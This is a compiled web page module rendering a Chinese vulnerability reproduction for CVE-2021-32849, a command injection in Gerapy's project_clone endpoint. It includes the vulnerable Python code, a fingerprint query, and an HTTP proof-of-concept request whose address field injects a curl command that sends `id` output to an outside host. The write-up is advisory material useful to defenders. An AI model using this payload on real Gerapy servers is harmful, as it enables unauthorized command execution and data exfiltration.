import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as s}from"./app-58e4a7d6.js";const a={},d=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>近日，我司应急团队监测到关于Gerapy 0.9.6和之前的版本中存在注入漏洞，漏洞编号：CVE-2021-32849，该漏洞源于程序没有正确清理通过project_clone端点传递给Popen的输入，攻击者可利用该漏洞执行任意命令。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Gerapy &lt;= 0.9.6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;Gerapy&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241450895.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现漏洞的文件为 <code>gerapy/server/core/views.py</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241450608.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>@api_view([&#39;POST&#39;])
@permission_classes([IsAuthenticated])
def project_clone(request):
    &quot;&quot;&quot;
    clone project from github
    :param request: request object
    :return: json
    &quot;&quot;&quot;
    if request.method == &#39;POST&#39;:
        data = json.loads(request.body)
        address = data.get(&#39;address&#39;)
        if not address.startswith(&#39;http&#39;):
            return JsonResponse({&#39;status&#39;: False})
        address = address + &#39;.git&#39; if not address.endswith(&#39;.git&#39;) else address
        cmd = &#39;git clone {address} {target}&#39;.format(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))
        logger.debug(&#39;clone cmd %s&#39;, mcd)
        p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        stdout, stderr = bytes2str(p.stdout.read()), bytes2str(p.stderr.read())
        logger.debug(&#39;clone run result %s&#39;, stdout)
        if stderr: logger.error(stderr)
        return JsonResponse({&#39;status&#39;: True}) if not stderr else JsonResponse({&#39;status&#39;: False})
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里可以看到 address参数 为可控参数，拼接到 cmd中使用 Popen命令执行，构造请求包</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /api/project/clone HTTP/1.1
Host: 
Content-Length: 61
Accept: application/json, text/plain, */*
Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

{&quot;address&quot;:&quot;http://127.0.0.1;curl xxx.xxx.xxx.xxx:9999?\`id\`&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241451576.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15),t=[d];function r(l,c){return i(),n("div",null,t)}const v=e(a,[["render",r],["__file","Gerapy clone 后台远程命令执行漏洞 CVE-2021-32849.html.vue"]]);export{v as default};
